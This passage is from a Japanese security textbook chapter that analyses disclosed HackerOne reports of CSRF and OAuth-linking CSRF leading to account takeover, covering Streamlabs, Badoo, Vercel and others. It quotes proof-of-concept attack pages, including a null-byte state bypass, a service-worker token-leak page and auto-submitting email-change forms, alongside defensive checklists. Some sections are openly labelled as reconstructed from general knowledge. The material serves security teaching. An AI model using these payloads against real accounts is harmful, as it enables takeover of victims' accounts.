# 第10章 実例・CVE・報奨事例

## HackerOne公開ATOレポート

本節では、HackerOneで公開されたCSRF（Cross-Site Request Forgery）／OAuth CSRFに起因するATO（Account Takeover、アカウント乗っ取り）レポートのうち、公開レベルの支持（upvote）が高く、かつ「なぜCSRFがATOにまで到達したか」という仕組みが典型的なものを3件取り上げる。いずれも既に公開・修正済みのレポートであり、対象組織への追試や再現は行わない。読者が学ぶべきは「個別のバグ」ではなく、CSRFがなぜアカウント乗っ取りという最悪級の影響に直結しやすいのかという構造である。

### なぜCSRF単体が「フルATO」に到達するのか

CSRFは本来、被害者に「意図しないリクエストを送らせる」だけの脆弱性であり、レスポンスを読み取ることはできない（Same-Origin Policyの制約により、クロスオリジンからのレスポンス本文の読み取りは阻止される）。しかし、以下の2種類のエンドポイントに対してCSRFが成立すると、レスポンスを読まなくても攻撃者はアカウントを完全に制御できるようになる。

1. **メールアドレス変更エンドポイント**: 被害者のメールアドレスを攻撃者が管理するアドレスに書き換えられれば、その後は正規のパスワードリセット機能を使うだけでアカウントの所有権を奪える。CSRFのレスポンスを読む必要がない点が重要で、「送信できるだけ」で完結する。
2. **OAuth／ソーシャルログイン連携エンドポイント**: 「このアカウントにGoogle/Facebook/Twitchなどの外部アカウントを紐付ける」機能に対してCSRFが成立すると、攻撃者は自分が完全にコントロールする外部アカウントを被害者のアカウントに紐付けることができる。その後は外部アカウント側でログインするだけで、被害者のアカウントに侵入できる。パスワードやメールアドレスを一切変更しないため、被害者は異変に気づきにくいという特徴もある。

この2パターンはいずれも「状態変更系（state-changing）のリクエストに対して、送信元の正当性を検証していない」という同じ欠陥に起因する。検証すべき代表的な仕組みは次の3つで、今回扱う事例はいずれかが欠落、または実装に不備があったケースである。

- CSRFトークン（推測不可能なワンタイム値をリクエストに含め、サーバー側で照合する）
- `Origin`/`Referer`ヘッダーの検証
- OAuthの`state`パラメータ（認可リクエストとコールバックを紐付け、CSRFを防ぐために標準仕様（RFC 6749）が定める値）

以下、3件を順に見ていく。

### 事例1: reddelexc/hackerone-reportsによるATO上位レポート集計（Rockstar Games / Logitech-Streamlabs 他）

`reddelexc/hackerone-reports`は、HackerOneで公開されているレポートをupvote数や賞金額で集計し、バグ種別・プログラム別のランキングとして`docs/tops_by_bug_type/`配下にまとめているリポジトリである。CSRFに起因するATO事例だけを集計した`TOPACCOUNTTAKEOVER.md`から、CSRF関連の上位項目を抜き出すと以下の通りである（2024年前後の集計時点のスナップショットであり、upvote数・賞金額はその後変動している可能性がある）。

| 順位 | タイトル | 対象プログラム | upvote | 賞金 |
|---|---|---|---|---|
| 22 | Account Takeover using Linked Accounts due to lack of CSRF protection | Rockstar Games | 238 | 非公開（bounty支給あり） |
| 58 | One Click Account takeover using Ouath CSRF bypass by adding Null byte %00 in state parameter on www.streamlabs.com | Logitech | 99 | $200 |
| 90 | [CRITICAL] Full account takeover using CSRF | Bumble | 62 | bounty支給あり |
| 212 | CSRF to account takeover in https://█████/ | U.S. Dept Of Defense | 8 | $0（VDPのため） |

> 出典: reddelexc/hackerone-reports — TOPACCOUNTTAKEOVER.md — https://github.com/reddelexc/hackerone-reports/blob/master/docs/tops_by_bug_type/TOPACCOUNTTAKEOVER.md

このリストで特に学びの多い2件を掘り下げる。

#### Rockstar Games: 「連携アカウント」機能でのCSRF（238 upvotes）

Rockstar Gamesの「Social Club」（ゲームアカウント基盤）には、Steam・Epic Games・PlayStation Networkなどの外部プラットフォームアカウントを紐付ける機能がある。このレポートのタイトルが示す通り、脆弱性の核心は「Linked Accounts（連携アカウント）機能にCSRF保護が存在しない」ことであり、攻撃者は被害者に悪意あるページを閲覧させるだけで、自分の外部プラットフォームアカウントを被害者のSocial Clubアカウントに紐付けることができた。紐付け後は、攻撃者は自分の外部アカウントでログインするだけで被害者のアカウント（保有ゲーム、課金情報、フレンドリストなど）に到達できる。238 upvotesという支持数は、HackerOneコミュニティ内でも「CSRF単体でここまで到達するのか」という教材的価値の高さを反映していると考えられる。

このケースが示す原則は、「メールアドレス変更」だけでなく「アカウント連携」もCSRF保護の対象に含めるべきだという点である。開発者はログイン画面やパスワード変更画面のCSRF対策には注意を払っても、「連携」のような一見補助的な機能のCSRF対策を見落としがちである。しかし連携機能はログインパスと機能的に等価であり、保護レベルもログイン・パスワード変更と同格に扱う必要がある。

#### Logitech（Streamlabs）: OAuthのstateパラメータへのNull Byteインジェクション（99 upvotes, $200）

このレポート（#1046630）は、別の先行レポート（#1039749）に対する「バイパス」として提出された点が興味深い。つまり一度修正が入った後、その修正が不完全であったために再度攻撃が成立したケースである。実際の再現手順を原文から引用する。

```
1. Login to attacker's account and go to settings --> account settings.
2. Intercept the request in burp suite and click on merge twitch account.
3. Allow twitch access and once you see a get request in burp with host
   streamlabs.com and parameters code, scope and state then generate CSRF PoC
   from burp suite and drop that request.
4. Add null byte character in state parameter and host that CSRF PoC on
   attacker.com and ask victim to visit attacker.com
5. Once victim visits attacker.com attacker's twitch account will be
   connected to victim's account.
6. Now attacker will login to victim's streamlabs.com using his twitch account.
```

PoCのHTMLは以下の通りである。

```html
<html>
<head>
<style>
h1 {text-align: center;}
p {text-align: center;}
div {text-align: center;}
</style>
</head>
<body>
<h1>One Click Account Takeover PoC By C0nquer0rs</h1>
<p>Click the button to go to the Streamlabs and check you're account settings.</p>
<h1><button onclick="document.location='https://streamlabs.com/auth?code=e5p67p5r6vjizvpl2fj756625zv8ra&scope=user_read&state=b33a75be1737978b4c5ea22f7bf53078c86256db-merge%00'">Click Me</button><h1>
</body>
</html>
```

**なぜNull Byte（`%00`）を末尾に付けるだけでstate検証を回避できたのか。** OAuthの`state`パラメータは、サーバーが認可リクエスト発行時に生成しセッションに紐付けた値と、コールバックで返ってきた値が完全一致するかどうかを検証することでCSRFを防ぐ仕組みである。ところがこのアプリケーションのサーバー側実装は、文字列比較の際にNull Byte以降を切り捨てる、あるいはNull Byteを含む文字列を「値なし」や「別処理」として扱うパーサ/言語ランタイムの挙動に引きずられていたと推測される（C言語の文字列がNull終端であることに由来する歴史的なパーサの脆弱性パターンであり、PHPやNode.jsのネイティブ拡張、あるいは正規表現ベースのバリデーションが`\0`を「文字列の終端」として扱ってしまうケースで頻出する）。攻撃者は自分の正規のOAuthフローで発行された有効な`state`値（`b33a75be...-merge`）の末尾に`%00`を付加して被害者に踏ませても、サーバー側の検証ロジックが実質的に元の`state`値と「同じもの」とみなしてしまい、CSRF対策としての一意性チェックが無効化された。結果として、攻撃者が自分のセッションで取得した認可コード（`code`パラメータ）を被害者のブラウザ経由でコールバックエンドポイントに送り込むことに成功し、被害者のStreamlabsアカウントに攻撃者のTwitchアカウントが連携された。

この事例からの教訓は次の2点である。

- OAuthの`state`検証は「文字列が存在するか」ではなく「完全一致（バイト単位）」で行う必要があり、正規化・トリミング・Null終端の扱いなど、比較対象の文字列処理系の癖に脆弱性が潜みやすい。
- 一度パッチされた脆弱性（#1039749）に対する「バイパス」が別途評価・報奨されている通り、CSRF対策の修正は「元の攻撃コードが通らなくなったか」ではなく「検証ロジックが仕様通り厳密に動作しているか」まで踏み込んでレビューする必要がある。

> 出典: reddelexc/hackerone-reports — TOPACCOUNTTAKEOVER.md — https://github.com/reddelexc/hackerone-reports/blob/master/docs/tops_by_bug_type/TOPACCOUNTTAKEOVER.md
> 出典: Logitech disclosed on HackerOne — Report #1046630 — https://hackerone.com/reports/1046630

### 事例2: Report #1018270 — メールアドレス変更にCSRF対策が皆無だったケース（U.S. Dept Of Defense）

このレポートは米国防総省（DoD）の脆弱性開示プログラム（VDP、Vulnerability Disclosure Program。バグ報奨金ではなく、脆弱性報告の受付・修正のみを目的とした無報酬プログラム）に対するもので、2020年10月25日に提出、同年11月9日に公開（disclose）された。対象ドメインはVDPの性質上、公開情報でも伏字（`█`）で伏せられている。severityは`critical`。

原文（要約）は次の通りである。

```
Summary:
There is no protection against CSRF in changing email which lead to
CSRF to account takeover on https://██████/.

Step-by-step Reproduction Instructions
1. Login as victim and check your infos in the account details
2. Open the CSRF malicious file which I have attached (csrf_POC.html)
3. Now the email is different (you can also change your name and
   other fields as well)
4. Now you can simply takeover the account
5. All you have to do is click on reset password on main page and
   enter the email you used to trick the victim and you will get
   instructions to reset the password. And you can successfully
   takeover the account
```

この報告が典型例として重要なのは、**攻撃の各ステップに何も高度な技術が使われていない**という点である。使われている武器は「CSRFトークンも`Origin`検証も存在しないPOSTエンドポイントに対する、ただの自動送信フォーム」だけであり、以下のような最小限のPoC HTMLで再現できる（原文には具体的なHTMLは添付ファイルとしてのみ存在し、本文中には記載されていないため、一般的なメールアドレス変更CSRF PoCの定型形で補足する）。

```html
<!-- （以下は未取得資料の補足として一般知識に基づく解説です。原文の添付ファイル csrf_POC.html
     の実物は本文中に含まれていなかったため、典型的な構成で示す） -->
<form id="f" method="POST" action="https://victim-site.example/account/change-email">
  <input type="hidden" name="email" value="attacker@evil.example">
</form>
<script>document.getElementById('f').submit();</script>
```

**なぜ「メール変更」だけでフルATOに到達するのか、仕組みを整理する。** パスワードリセット機能は一般に「登録済みメールアドレス宛てにリセットリンクを送る」という設計になっている。この設計自体は正しいセキュリティプラクティスだが、前提として「そのメールアドレスの登録者が本人である」ことが暗黙の信頼基盤になっている。CSRFによってメールアドレスというレコードそのものが書き換えられてしまうと、この信頼基盤が崩れ、パスワードリセット機能が「本人確認の手段」から「攻撃者にアカウントを明け渡す手段」に反転する。つまりCSRF対策の欠如は、メールアドレス変更エンドポイント単体の弱点にとどまらず、パスワードリセットという別の正規機能の安全性の前提を破壊する点で、単純な「情報改ざん」以上の連鎖的な影響（chained impact）を持つ。

このレポートに対する提案された修正（Suggested Mitigation）も原文に明記されている。

```
Use captchas and CSRF-tokens for be sure that the victim is changing
the datas knowing that.
```

CAPTCHAはユーザーの明示的な操作を強制する対策ではあるが、CSRF対策の本筋はあくまで「リクエストが正規のページ由来かどうかをサーバー側で検証すること」であり、実務的には次のいずれか（できれば複数）を組み合わせるべきである。

- 同期トークンパターン（Synchronizer Token Pattern）: セッションごとに発行したCSRFトークンをフォームに埋め込み、サーバー側で照合する。
- `SameSite=Lax`または`Strict`属性をセッションCookieに付与し、クロスサイトの自動送信リクエストにそもそもCookieが同送されないようにする。
- メールアドレスなどの重要情報を変更する操作には、変更前に現在のパスワードの再入力を要求する（ステップアップ認証）。これはCSRFトークンが万一漏洩・欠落していても、被害者のブラウザが自動的に持っている情報（Cookie）だけでは完結しない追加の摩擦を作る、多層防御の一種である。

> 出典: U.S. Dept Of Defense disclosed on HackerOne — Report #1018270, "CSRF to account takeover" — https://hackerone.com/reports/1018270

### 事例3: Report #127703 — chrome-service-worker.jsへのCSRFトークン漏洩からのOAuth連携CSRF（Bumble/Badoo）

このレポートは2016年4月2日にBumble（当時のBadoo）へ提出され、同年4月12日に公開・報奨されたもので、severityは`critical`。タイトル通り「CSRFによるフルアカウント乗っ取り」だが、単純にCSRFトークンが存在しなかったわけではない点が他の2事例と異なり、教育的価値が高い。**このケースではCSRF対策となる`rt`パラメータ（stateトークンに相当する値）自体は存在していた。しかし、その値がまったく無関係な場所から漏洩していた**ために対策が無力化された。

原文の技術詳細を引用する。

```
When a user tries to link a gmail account with his account, after he
authorizes badoo to use his gmail account he will be redirected to
`https://eu1.badoo.com/google/verify.phtml?rt=<State_param_value>&code=<Code_returned_from_google>`,
the only thing that protects from CSRF is the `rt` parameter which is
unique for each user/session. I have noticed that the `rt` parameter
is returned on almost all json responses so I tried to find a link
that leaks it. After digging for a while, I have found this link
https://eu1.badoo.com/worker-scope/chrome-service-worker.js, and I
was surprised that it contains the `rt` parameter value!!
```

漏洩箇所となったService Worker用スクリプトの中身（該当変数のみ抜粋）は次の通りである。

```javascript
var url_stats = 'https://eu1.badoo.com/chrome-push-stats?ws=1&rt=<rt_param_value>';
```

そしてこの漏洩値を利用した実際のPoCコードが以下である。

```html
<html>
<head>
<title>Badoo account take over</title>
<script src=https://eu1.badoo.com/worker-scope/chrome-service-worker.js?ws=1></script>
</head>
<body>
<script>
function getCSRFcode(str) {
    return str.split('=')[2];
}
window.onload = function(){
var csrf_code = getCSRFcode(url_stats);
csrf_url = 'https://eu1.badoo.com/google/verify.phtml?code=4/nprfspM3yfn2SFUBear08KQaXo609JkArgoju1gZ6Pc&authuser=3&session_state=7cb85df679219ce71044666c7be3e037ff54b560..a810&prompt=none&rt='+ csrf_code;
window.location = csrf_url;
};
</script>
</body>
</html>
```

**なぜこのPoCが機能したのか、仕組みを段階的に説明する。**

1. **`<script src=...>`によるクロスオリジン読み込みはSame-Origin Policyの制約を受けない。** SOPが制限するのは「レスポンスのJavaScriptからの読み取り」であるが、`<script>`タグでの読み込みは「スクリプトとして実行すること」自体が目的であり、ブラウザはこれをブロックしない。しかもCookieはリクエスト先ドメイン（`eu1.badoo.com`）宛てに自動送信されるため、被害者が既にBadooにログイン済みであれば、被害者自身のセッションでこの`chrome-service-worker.js`が取得される。
2. **このJSファイルはグローバルスコープで`var url_stats = '...rt=<被害者本人のrt値>'`という文を実行する。** これは通常のJSONのような「データ」ではなく実行可能なJavaScriptコードであるため、攻撃者のページから`<script src>`で読み込むだけで、そのグローバル変数`url_stats`が攻撃者のページの実行コンテキストにそのまま生成される。これは典型的な「JSONP的な情報漏洩（JavaScript実行可能なレスポンスに機密値が平文で埋め込まれ、クロスオリジンから読み取り可能になってしまう）」のパターンである。JSON形式のAPIレスポンスであれば`<script src>`で読み込んでもオブジェクトリテラルとして評価されるだけで変数に代入されず窃取できないが、この`chrome-service-worker.js`は「代入文を含むJavaScriptそのもの」だったために、値がそのままグローバル変数として攻撃者のスコープに漏れ出した。
3. 攻撃者はこうして入手した被害者の`rt`値を、**攻撃者自身が保有するGmailアカウントの認可コード（`code`パラメータ、攻撃者が自分のGoogleアカウントで認可を得て取得した正規の値）**と組み合わせて、`/google/verify.phtml`エンドポイントへのリクエストを構築する。この`rt`パラメータは「誰の」CSRFトークンかをサーバーが検証する仕組みではなく、単に「有効な値かどうか」だけを見ていたと考えられ、被害者のセッションCookie＋被害者自身の`rt`値＋攻撃者のGoogle認可コードという組み合わせでリクエストが成立してしまった。
4. 被害者がこのPoCページを開いた瞬間（`window.onload`）に自動的にリダイレクトが発生し、被害者のBadooアカウントに攻撃者のGmailアカウントが連携される。以後、攻撃者は自分のGmailアカウントでソーシャルログインするだけで被害者のアカウントに侵入できる。

このケースの本質的な教訓は、「CSRFトークンを実装している」ことと「CSRF対策が機能している」ことは同義ではないという点である。トークンの生成・検証ロジック自体が正しくても、**トークンの値がアプリケーションの別の経路（この場合はService Worker用の統計送信スクリプト）から漏洩していれば、対策は全体として無効化される**。これは横断的関心事（cross-cutting concern）としてのセキュリティレビューの重要性を示す例で、「認可・連携機能」のセキュリティレビューだけでなく、「一見無関係なJSファイルやAPIレスポンスに機密トークンが平文で混入していないか」という観点の監査（機密値のgrep監査、レスポンスボディ全体の棚卸し）が必要であることを示している。

> 出典: Bumble (Badoo) disclosed on HackerOne — Report #127703, "[CRITICAL] Full account takeover using CSRF" — https://hackerone.com/reports/127703

### 3事例の比較と実務への示唆

| 観点 | Rockstar Games (#463330) | DoD (#1018270) | Bumble/Badoo (#127703) |
|---|---|---|---|
| 対策の状態 | CSRF対策そのものが存在しない | CSRF対策そのものが存在しない | `state`相当のトークン(`rt`)は実装されていたが漏洩 |
| 悪用された機能 | 外部アカウント連携 | メールアドレス変更 | Google/Gmailアカウント連携（OAuth） |
| ATOへの到達経路 | 連携アカウントでのログイン | パスワードリセット機能の悪用 | 連携アカウントでのログイン |
| 教訓 | 「連携」機能もログイン相当の保護レベルが必要 | 情報変更系エンドポイント全てにCSRF対策が要る | トークンの実装だけでなく漏洩経路の監査が必要 |

3件に共通するのは、**攻撃者が読み取り不能なはずのレスポンスを一切必要としなかった**という点である。CSRFは「盲目的な書き込み攻撃」であり、書き込み先が「メールアドレス」または「外部ログイン連携」という、その後の操作でアカウントの完全制御に直結するフィールドである場合、CSRFはXSSやSQLインジェクションに匹敵する重大度（Critical）に格上げされる。防御側は、CSRFトークンや`SameSite`属性の実装状況を機能ごとに棚卸しする際、「見た目の重要度が低そうな連携・設定変更系エンドポイント」を対象から漏らさないことが最も重要な実務上のチェックポイントである。

## OAuth連携によるATO事例

CSRFという脆弱性クラスが今なお高額・高重大度の報奨を生み続けている最大の理由の一つが「OAuth連携（アカウント連携）」機能である。ログインフォームへのCSRF対策（CSRFトークン、`SameSite`Cookieなど）は近年広く実装されるようになったが、「既存アカウントに外部サービス（GitHub・Facebook・Googleなど）を後から紐付ける」機能は実装が後回しにされがちで、CSRF対策が抜け落ちたまま本番稼働してしまうケースが後を絶たない。本節では、Vercel（当時はZeitという社名だった時代の後継サービス）とPeriscope（旧Twitter、現X傘下）という、性質の異なる2つの実例を通じて、「OAuth連携CSRF」がなぜAccount Takeover（ATO、アカウント乗っ取り）に直結するのかを、プロトコルレベルの仕組みから解説する。

まず結論を先に示す。ログイン用のCSRF（Login CSRF）は「攻撃者のアカウントに被害者を気づかぬうちにログインさせる」攻撃であるのに対し、アカウント連携のCSRF（Linking CSRF）は「被害者の（正規の）アカウントに、攻撃者が支配する外部アカウントを紐付けさせる」攻撃である。前者は被害者が変な状態に気づきやすいが、後者は被害者からは何も変わって見えないまま、水面下で「あなたのアカウント」と「攻撃者のGitHub/Facebookアカウント」が結びつけられてしまう点が特に危険である。結びつけられた後、攻撃者は「その外部アカウントでログインする」という正規の導線を使うだけで、被害者のアカウントに正規ログインしたのと同じ状態になる。

### 事例1: Vercel #542047 ― CSRFによるGitHub連携乗っ取り

#### 対象と概要

- **対象プログラム**: Vercel（Vercel Open Source / Vercelプラットフォーム本体のバグバウンティ）
- **レポートタイトル**: "CSRF On Connect Account With Github Lead To Account Takeover"
- **作成日**: 2019年4月18日、**公開日**: 2019年5月19日
- **評価**: 29 upvote、報奨金は $0（Vercel側の当時のトリアージ方針・重複判定などにより無報奨だったと見られる）

> ⚠️ **未取得の資料**: HackerOneレポート「Vercel #542047 (CSRF On Connect Account With Github Lead To Account Takeover)」の本文（Steps to Reproduce・PoC・Activity欄のやり取り）は自動取得できませんでした（理由: `https://hackerone.com/reports/542047` への直接アクセスが `HTTP 403 Forbidden` で拒否され、GitHubミラー（`reddelexc/hackerone-reports`）にもタイトル・upvote数・報奨額のメタデータのみが収録されており、本文は含まれていませんでした）。詳細な再現手順や実際のPoCコードをご覧になりたい場合は、以下のURLからご自身で直接ご覧ください: https://hackerone.com/reports/542047

（以下は未取得資料の補足として一般知識に基づく解説です）

#### 仕組み: なぜ「連携ボタン」がCSRFの標的になるのか

Vercelのようなホスティング/デプロイサービスでは、ユーザーは自分のアカウントに「GitHubを連携する」ボタンを押すことで、GitHubリポジトリと連携したデプロイパイプラインを構築できる。この連携は典型的には以下のOAuth 2.0 Authorization Code フローで実現される。

```
1. ユーザーが Vercel 上で「Connect GitHub」をクリック
   → ブラウザが GET https://vercel.com/auth/github/connect にアクセス
   → Vercel はサーバー側で state値(csrfトークンに相当)を生成し、
     セッションに保存した上で GitHub の認可エンドポイントへリダイレクト

2. https://github.com/login/oauth/authorize?client_id=...&state=<state>&redirect_uri=https://vercel.com/auth/github/callback
   → ユーザーが GitHub 上で「Authorize」をクリック

3. GitHub が redirect_uri へ認可コードを付けてリダイレクト
   GET https://vercel.com/auth/github/callback?code=<code>&state=<state>

4. Vercel サーバーが code を GitHub と交換してアクセストークンを取得し、
   そのGitHubアカウントを「現在ログイン中のVercelセッションのユーザー」に紐付ける
```

このフローの4番目のステップ、つまり「コールバックを受け取った時点でどのVercelアカウントに紐付けるか」の判定に不備があると、CSRFが成立する。具体的には次の2つのいずれか（あるいは両方）が欠けていたと考えられる。

1. **`state`パラメータの検証漏れ、または`state`とVercel側セッションの紐付け漏れ**
   OAuthの`state`パラメータは本来「フローを開始したブラウザセッションと、コールバックを受け取ったブラウザセッションが同一であること」を保証するためのCSRF対策トークンである。Vercelがコールバック受信時に「渡された`state`が、直前に自分（このセッション）が発行したものと一致するか」を検証していなければ、攻撃者は**自分のGitHubアカウントで認可を完了させて得たコールバックURL（`code`と`state`のペア）を丸ごと被害者に踏ませる**ことができる。

2. **コールバックのGETリクエストがブラウザによる自然な遷移として成立してしまう**
   OAuthのコールバックは仕様上GETリクエストであり、`<img>`や`<iframe>`、あるいは単なるリンクのクリックだけで発火する。CSRFトークンによる保護がなければ、攻撃者は次のようなHTMLを被害者に踏ませるだけで攻撃が完了する。

```html
<!-- 攻撃者が用意する罠ページ -->
<html>
  <body onload="document.forms[0].submit()">
    <!-- あるいは単純に -->
    <img src="https://vercel.com/auth/github/callback?code=ATTACKER_VALID_CODE&state=ATTACKER_VALID_STATE" style="display:none">
  </body>
</html>
```

ここでの核心は、`code`と`state`はいずれも**攻撃者自身のGitHubアカウントで正規に発行された、有効な値**だという点である。攻撃者は事前に自分のブラウザでVercelの「Connect GitHub」フローを1歩手前まで進め、GitHubの認可画面で「Authorize」を押した直後にリダイレクトされる`callback?code=...&state=...`というURLを**自分では踏まずにコピーして**、被害者に踏ませる。Vercel側のコールバックハンドラが「このcode/stateは今アクセスしてきたセッション（＝被害者のログイン中セッション）が発行したものかどうか」を確認していなければ、サーバーは律儀に「code交換→GitHubアカウント情報取得→**現在ログイン中のセッションのユーザー**（＝被害者）に、攻撃者のGitHubアカウントを連携」という処理を実行してしまう。

#### 影響とその後の乗っ取り経路

連携が成立すると、多くのプラットフォームでは「連携済みの外部アカウントでのログイン」を許可している。つまり攻撃者は、この時点で被害者のVercelアカウントに対して次のいずれかを実行できるようになる。

- 「Sign in with GitHub」ボタンから**自分のGitHubアカウントでログイン**し、被害者のVercelアカウントを完全に乗っ取る
- 連携によって開放される権限（例: GitHub経由でのデプロイトリガー、リポジトリアクセス権の共有）を悪用し、被害者のプロジェクトやデプロイ設定を書き換える

これは典型的な「連携CSRF → フルATO」の連鎖であり、影響度としてはパスワード窃取と同等かそれ以上に深刻である。パスワードは被害者が変更すれば無効化されるが、外部アカウント連携は被害者が「連携解除」の存在に気づかない限り放置され、**攻撃者はいつでも再ログインできる持続的なバックドア**として機能し続ける。

#### 修正の考え方

このクラスの脆弱性に対する根本的な修正は以下の3点に集約される。

1. **`state`パラメータをセッションに紐付けたランダム値として生成し、コールバック時に厳密検証する**（一致しなければ即座に処理を中断し、フローを最初からやり直させる）
2. **連携（linking）フローと新規ログイン（login）フローを明確に分離**し、「既にログイン中のユーザーへの連携」は、連携開始時点のCSRFトークンを検証してから初めて実行する
3. **`SameSite=Lax`または`Strict`のCookie属性**を連携開始のセッションCookieに設定し、他サイト起点のトップレベルナビゲーションであってもクロスサイトなPOST由来の連携処理が動かないようにする（ただしGETベースのコールバックはLaxでも通ってしまう点に注意。真の対策は`state`検証である）

> 出典: Vercel disclosed on HackerOne: CSRF On Connect Account With Github Lead To Account Takeover — https://hackerone.com/reports/542047

### 事例2: Periscope（現X） #235642 ― CSRFによるFacebook連携乗っ取り

#### 対象と概要

- **対象プログラム**: X / xAI（当時はTwitter社。対象サービスはライブ配信アプリ「Periscope」）
- **レポートタイトル**: "[CRITICAL] Full account takeover using CSRF"
- **報告者**: yipman
- **重大度**: Critical（クリティカル）
- **報告日**: 2017年6月2日、**解決**: Resolved、**公開日**: 2017年11月3日
- **評価**: 87 upvote、報奨金あり（bounty対象として認定。金額はレポート非公開部分にあり本稿では確認できていない）

> ⚠️ **未取得の資料**: HackerOneレポート「X/xAI #235642 ([CRITICAL] Full account takeover using CSRF)」の本文（Steps to Reproduce・PoC・具体的な脆弱パラメータ名・報奨金額）は自動取得できませんでした（理由: `https://hackerone.com/reports/542047`と同様に`https://hackerone.com/reports/235642`への直接アクセスがブロックされ、レンダリング前のプレースホルダのみが返され、また同社のJSON APIエンドポイントおよびGitHubミラーからは報告日・重大度・upvote数・解決状況などのメタデータのみが取得でき、本文相当の技術詳細は取得できませんでした）。詳細をご覧になりたい場合は、以下のURLからご自身で直接ご覧ください: https://hackerone.com/reports/235642

（以下は未取得資料の補足として一般知識に基づく解説です。同時期にPeriscope/Twitterからは類似の関連レポート（例: Periscope Web OAuth認可エンドポイントのCSRF、報告日2017年3月22日、上位公開レポートとして72 upvote・こちらもbounty $0という記録がある）が複数disclosureされており、Periscopeの「サードパーティ/ソーシャル連携」まわりに横断的なCSRF対策の不備があった時期だったと推測される。)

#### 仕組み: SNSアプリならではの「多重アイデンティティ連携」の危険性

Periscopeはライブ配信をTwitterやFacebookに同時配信する機能を持ち、そのためにユーザーは自分のPeriscopeアカウントにFacebookアカウント（あるいはTwitterアカウント）を連携する。これは前述のVercelの事例と全く同じ「OAuth連携（Account Linking）」パターンであり、攻撃の骨格も同一である。

```
1. 被害者は既に Periscope に自分のアカウントでログイン済み
2. 攻撃者は自分のFacebookアカウントでPeriscopeの「Facebook連携」フローを
   認可画面まで進め、コールバックURL（code/tokenを含む）を入手する
   （例: GET https://www.periscope.tv/account/connect/facebook/callback?code=ATTACKER_CODE ）
3. 攻撃者はこのURLを埋め込んだ罠ページ（あるいは <img> タグ、自動submitフォーム）を
   被害者に踏ませる（例: DM、埋め込みリンク、悪意あるWebページへの誘導）
4. Periscopeサーバーがコールバックを「現在ログイン中のセッション（＝被害者）」の
   ものとして処理し、攻撃者のFacebookアカウントを被害者のPeriscopeアカウントに連携
5. 攻撃者は「Facebookでログイン」導線から、被害者のPeriscopeアカウントに
   フルアクセスできるようになる（Critical判定・Full Account Takeoverの所以）
```

Vercelの事例と本質的に同じ「`state`検証の欠如、またはコールバック処理と発行元セッションの紐付け欠如」が根本原因と考えられる。ただしPeriscope側は評価がCritical・87 upvoteと非常に高く、これはSNS連携特有の以下の要因が影響しているとみられる。

- **被害者側の異常検知が極めて難しい**: Facebook連携のような「バックグラウンドの機能」は普段ユーザーが意識して確認する画面ではないため、乗っ取られたことに気づく手段が乏しい。
- **配信中のライブ映像・DM・フォロワー情報など、プライバシー影響が大きいデータへの導線になる**: Periscopeはライブ配信サービスであるため、アカウント乗っ取りは配信の乗っ取り・なりすまし配信・フォロワーへの被害拡大に直結する。
- **モバイルアプリ内WebView経由のOAuthフロー特有の弱点**: モバイルアプリ内でOAuth連携を行う場合、WebViewの実装によっては`Referer`ヘッダやCookieのSameSite挙動がブラウザと異なり、追加の対策（PKCEやワンタイムのディープリンクトークンなど）を組み込まない限りCSRF的な誤ジョインが起きやすい。

#### 防御側の学び: OAuth連携CSRFのチェックリスト

この2つの実例を踏まえ、開発者・診断者双方が確認すべき防御ポイントを整理する。

| # | 確認項目 | 具体的なテスト方法 |
|---|---|---|
| 1 | 連携開始時に`state`が発行され、セッションに保存されているか | 連携開始リクエストを2回発行し、`state`値が毎回変わり、かつセッションごとに異なることを確認する |
| 2 | コールバック処理で`state`をセッション内の値と厳密照合しているか | 自分のセッションで発行された`state`を、別セッション（別ブラウザ/シークレットウィンドウ）のコールバックにすり替えて送り、拒否されるか確認する |
| 3 | コールバックURLを他人に転送しても連携が成立しないか | 実際に「自分の認可済みcode/stateを含むURL」を被害者役の別セッションで開き、連携が発生しないことを確認する（これが本節2事例のPoCの核心） |
| 4 | 連携解除（unlink）や連携済み一覧の確認UIが用意されているか | ユーザーが「どの外部アカウントが連携されているか」をいつでも確認・解除できるようにし、乗っ取りに気づいた際の復旧経路を確保する |
| 5 | 連携によって新たに得られる権限がログインと同等以上でないか | 「連携＝即ログイン手段」となっている設計は、連携CSRFのリスクをログインCSRFと同等の重大度に引き上げることを認識する |

これらはいずれも「OAuthの`state`パラメータはCSRFトークンそのものである」という一点に還元される。認可コードフロー（Authorization Code Flow）を実装する際、`state`を省略したり、検証をクライアント側JavaScriptだけに委ねたり、あるいは検証はしていてもセッションとの紐付けを怠ったりすると、たとえ通信経路がTLSで保護されていても、また`client_secret`が漏洩していなくても、CSRFという別の攻撃ベクトルからアカウント乗っ取りに直結してしまう。これが、CSRFという一見「古典的」な脆弱性が、OAuthというモダンな認可プロトコルの文脈で今なお繰り返し発見され続けている理由である。

> 出典: X / xAI disclosed on HackerOne: [CRITICAL] Full account takeover using CSRF — https://hackerone.com/reports/235642

### 章のまとめ

- CSRFは「ログイン処理」だけでなく「アカウント連携（Linking）処理」にも同じ原理で成立し、後者は影響がより深刻かつ発覚しにくい。
- 攻撃者は自分自身の正規のOAuth認可フローを完了させ、その結果得られる有効な`code`/`state`を含むコールバックURLを被害者に踏ませることで、被害者のアカウントに攻撃者の外部アカウントを紐付けさせる。
- 根本対策は、OAuthの`state`パラメータを「セッション固有のCSRFトークン」として正しく発行・保存・検証することであり、`SameSite`Cookieなどのブラウザ側対策はこれを補完するものであって代替にはならない。
- 診断時は「連携済みURLを別セッションへ転送しても処理が成立するか」を実際に確認することが、このクラスの脆弱性を見つける最も直接的なテストである。

## CORS関連CVE/advisoryと実戦記

CORS（Cross-Origin Resource Sharing）の設定ミスは、単体では「情報が読めてしまう」だけに見えて軽視されがちだが、認証済みセッションと組み合わさると**アカウント乗っ取り（ATO: Account Takeover）**、さらには**リモートコード実行（RCE）**にまで発展する。この節では、実際にCVE番号が付いた4件の事例（OSS製品3件＋バグバウンティ実戦記1件）を通して、「どういうコードがなぜ危険なのか」を仕組みレベルで解剖する。

前提として、CORSの悪用が成立する条件を最初に整理しておく。攻撃者ページ（`https://evil.com`）から被害者ブラウザ経由で標的APIに**認証情報（Cookie等）付きのクロスオリジン要求**を投げ、その**レスポンスを攻撃者JavaScriptが読み取れてしまう**には、標的のレスポンスに次の2つが同時に揃う必要がある。

1. `Access-Control-Allow-Origin`（以下 ACAO）が攻撃者オリジンを許可している
2. `Access-Control-Allow-Credentials`（以下 ACAC）が `true`

